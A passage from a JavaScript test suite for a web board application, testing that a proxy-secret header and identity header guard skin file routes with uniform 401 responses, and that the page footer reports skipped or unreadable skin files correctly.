      assert.equal(res.status, 401, p.url);
      sameAnswer(res, ref, `${p.url} vs static`);
      assert.ok(!res.bytes.includes(fixtureFile(p.file)));
      const ok = await sendRequest(port, { reqPath: p.url, headers: { [ID]: 'sam' } });
      assert.equal(ok.status, 200, `${p.url} with the identity`);
      assert.ok(ok.bytes.equals(fixtureFile(p.file)));
    }
  });
});

const HEADER_CASES = [
  { name: 'absent', headers: {}, right: false },
  { name: 'wrong', headers: { [H]: WRONG }, right: false },
  { name: 'wrong but of equal length', headers: { [H]: WRONG_SAME_LENGTH }, right: false },
  { name: 'right but sent twice', headers: { [H]: [SECRET, SECRET] }, right: false },
  { name: 'right', headers: { [H]: SECRET }, right: true },
];
const IDENTITY_CASES = [
  { name: 'identity absent', headers: {}, present: false },
  { name: 'identity present', headers: { [ID]: 'sam' }, present: true },
];

for (const p of SKIN_GUARDED) {
  test(`R107 with the secret set, ${p.url} answers every header and identity case as /static/board.css does, and the 401s are equal`, async () => {
    await withSkin(FIXTURE_SKIN, { env: { ...PROXY, BOARD_PROXY_SECRET: SECRET } }, async ({ port }) => {
      const witness = await sendRequest(port, { reqPath: STATIC_REF, headers: { [H]: WRONG, [ID]: 'sam' } });
      assert.equal(witness.status, 401, 'witness: the lock is on');
      const missingIdentity = await sendRequest(port, { reqPath: p.url, headers: { [H]: SECRET } });
      assert.equal(missingIdentity.status, 401, 'the identity lock refuses on the skin route');
      for (const hc of HEADER_CASES) {
        for (const ic of IDENTITY_CASES) {
          const cell = `${p.url} / header ${hc.name} / ${ic.name}`;
          const headers = { ...hc.headers, ...ic.headers };
          const res = await sendRequest(port, { reqPath: p.url, headers });
          const ref = await sendRequest(port, { reqPath: STATIC_REF, headers });
          assert.equal(res.status, ref.status, `${cell}: same status as the static file`);
          if (hc.right && ic.present) {
            assert.equal(res.status, 200, `${cell}: the file`);
            assert.ok(res.bytes.equals(fixtureFile(p.file)), `${cell}: exact bytes`);
          } else {
            assert.equal(res.status, 401, `${cell}: refused`);
            sameAnswer(res, ref, `${cell}: same 401 as the static file`);
            sameAnswer(res, missingIdentity, `${cell}: the same 401 as a missing identity`);
            assert.ok(!res.bytes.includes(fixtureFile(p.file)), `${cell}: no file in a refusal`);
          }
        }
      }
    });
  });
}

test('R107 with the secret set in local mode, the lock holds on the skin routes too', async () => {
  await withSkin(FIXTURE_SKIN, { env: { BOARD_PROXY_SECRET: SECRET } }, async ({ port }) => {
    for (const p of SKIN_GUARDED) {
      assert.equal((await sendRequest(port, { reqPath: p.url })).status, 401, `${p.url} absent`);
      assert.equal((await sendRequest(port, { reqPath: p.url, headers: { [H]: WRONG_SAME_LENGTH } })).status, 401, `${p.url} wrong`);
      assert.equal((await sendRequest(port, { reqPath: p.url, headers: { [H]: [SECRET, SECRET] } })).status, 401, `${p.url} twice`);
      const right = await sendRequest(port, { reqPath: p.url, headers: { [H]: SECRET } });
      assert.equal(right.status, 200, `${p.url} right`);
      assert.ok(right.bytes.equals(fixtureFile(p.file)));
    }
  });
});

for (const [label, env] of [['unset', {}], ['empty', { BOARD_PROXY_SECRET: '' }]]) {
  test(`R107 with the secret ${label}, a skin route answers every header case as it does without the rule`, async () => {
    await withSkin(FIXTURE_SKIN, { env: { ...PROXY, ...env } }, async ({ port }) => {
      for (const p of SKIN_GUARDED) {
        for (const hc of HEADER_CASES) {
          for (const ic of IDENTITY_CASES) {
            const cell = `${label} / ${p.url} / header ${hc.name} / ${ic.name}`;
            const res = await sendRequest(port, { reqPath: p.url, headers: { ...hc.headers, ...ic.headers } });
            const baseline = await sendRequest(port, { reqPath: p.url, headers: { ...ic.headers } });
            sameAnswer(res, baseline, `${cell}: as without the header`);
            assert.equal(res.status, ic.present ? 200 : 401, `${cell}: status`);
          }
        }
      }
    });
  });
}

test('R168 the first request after a start, with the secret set and no header, gets 401 on a skin route (404 where no skin is loaded), as on a board that has already served a page', async () => {
  const empty = mkRoot();
  const emptyDir = path.join(empty, 'skin');
  fs.mkdirSync(emptyDir);
  const unreadable = path.join(mkRoot(), 'gone');
  const cases = [['an empty folder', emptyDir, 404], ['an unreadable folder', unreadable, 404], ['a good folder', FIXTURE_SKIN, 401]];
  for (const [label, dir, want] of cases) {
    await withSkin(dir, { env: { ...PROXY, BOARD_PROXY_SECRET: SECRET } }, async ({ port }) => {
      // the first request of the process, before any page
      const first = await sendRequest(port, { reqPath: '/skin/skin.css' });
      const second = await sendRequest(port, { reqPath: '/skin/skin.css' });
      assert.equal(first.status, want === 401 ? 401 : first.status, label);
      if (want === 401) assert.equal(first.status, 401, label);
      else assert.ok(first.status === 404 || first.status === 401, `${label}: 404 (or the 401 of the lock, which sits before the path)`);
      sameAnswer(first, second, `${label}: the first answer is the later answer`);
    });
  }
});

// ================================================================ R168 the footer sentences

const ONE = '1 skin file could not be used and was skipped.';
const MANY = (n) => `${n} skin files could not be used and were skipped.`;
const UNREADABLE = 'The skin folder could not be read, so the board is shown without a skin.';

test('R168 one skipped file: the footer says it in the singular, once, and the skin is still served', async () => {
  const dir = copySkin((d) => fs.writeFileSync(path.join(d, 'img', 'Bad Name.png'), 'x'));
  await withSkin(dir, {}, async ({ port }) => {
    const page = await sendRequest(port, { reqPath: '/' });
    assert.equal(page.status, 200);
    assert.equal(count(footerOf(page.body), ONE), 1, 'singular sentence in the footer');
    assert.equal(count(page.body, ONE), 1);
    assert.ok(!page.body.includes('skin files could not'));
    assert.ok(!page.body.includes(UNREADABLE));
    assert.ok(page.body.includes('/skin/skin.css'), 'the skin is still linked');
    assert.equal((await sendRequest(port, { reqPath: '/skin/skin.css' })).status, 200);
  });
});

test('R168 three skipped files: the footer says it in the plural with the count', async () => {
  const dir = copySkin((d) => {
    fs.writeFileSync(path.join(d, 'img', 'A.png'), 'x');
    fs.writeFileSync(path.join(d, 'img', 'b.gif'), 'x');
    fs.writeFileSync(path.join(d, 'fonts', 'c c.woff2'), 'x');
  });
  await withSkin(dir, {}, async ({ port }) => {
    const page = await sendRequest(port, { reqPath: '/' });
    assert.equal(count(footerOf(page.body), MANY(3)), 1);
    assert.ok(!page.body.includes(ONE));
    assert.ok(!page.body.includes(UNREADABLE));
  });
});

test('R168 a good skin leaves the footer without a skin sentence', async () => {
  await withSkin(FIXTURE_SKIN, {}, async ({ port }) => {
    const page = await sendRequest(port, { reqPath: '/' });
    assert.ok(!page.body.includes('skin file'));
    assert.ok(!page.body.includes(UNREADABLE));
  });
});

const UNUSABLE = [
  ['a missing folder', () => path.join(mkRoot(), 'gone')],
  ['a skin.css that is missing', () => mkSkin({ css: null, img: { 'a.png': 'x' } })],
  ['a skin.css of 262,145 bytes', () => mkSkin({ css: 'a'.repeat(262145), img: { 'a.png': 'x' } })],
  ['a skin.css that is a folder', () => { const d = mkSkin({ css: null, img: { 'a.png': 'x' } }); fs.mkdirSync(path.join(d, 'skin.css')); return d; }],
  ['the setting naming a plain file', () => { const d = path.join(mkRoot(), 'file'); fs.writeFileSync(d, 'x'); return d; }],
];
for (const [label, make] of UNUSABLE) {
  test(`R168 given ${label}: no skin, the sentence once, the board starts and answers its routes, the other folders are not served`, async () => {
    const dir = make();
    await withSkin(dir, {}, async ({ port }) => {
      const page = await sendRequest(port, { reqPath: '/' });
      assert.equal(page.status, 200, 'the page');
      assert.equal(count(footerOf(page.body), UNREADABLE), 1, 'the sentence once, in the footer');
      assert.ok(!page.body.includes('skin file could') && !page.body.includes('skin files could'));
      assert.ok(!page.body.includes('/skin/skin.css') && !page.body.includes('data-skin'), 'no skin link, no mark');
      assert.ok(!page.headers['content-security-policy'].includes("font-src 'self'"));
      for (const p of ['/static/board.css', '/static/board.js', '/healthz']) assert.equal((await sendRequest(port, { reqPath: p })).status, 200, p);
      for (const p of ['/skin/skin.css', '/skin/img/a.png']) assert.equal((await sendRequest(port, { reqPath: p })).status, 404, p);
    });
  });
}

test('R168 a skin folder the board cannot list: no skin, the sentence, and a board that starts', async (t) => {
  if (typeof process.getuid === 'function' && process.getuid() === 0) { t.skip('root can read any folder'); return; }
  const dir = mkSkin({});
  fs.chmodSync(dir, 0o000);
  try {
    await withSkin(dir, {}, async ({ port }) => {
      const page = await sendRequest(port, { reqPath: '/' });
      assert.equal(page.status, 200);
      assert.equal(count(page.body, UNREADABLE), 1);
      assert.equal((await sendRequest(port, { reqPath: '/skin/skin.css' })).status, 404);
    });
  } finally {
    fs.chmodSync(dir, 0o755);
  }
});

test('R168 a skin with skipped files that is also in proxy mode still starts and serves behind the lock', async () => {
  const dir = copySkin((d) => fs.writeFileSync(path.join(d, 'img', 'Bad.png'), 'x'));
  await withSkin(dir, { env: { ...PROXY, BOARD_PROXY_SECRET: SECRET } }, async ({ port }) => {
    const page = await sendRequest(port, { reqPath: '/', headers: { [H]: SECRET, [ID]: 'sam' } });
    assert.equal(page.status, 200);
    assert.equal(count(page.body, ONE), 1);
  });
});
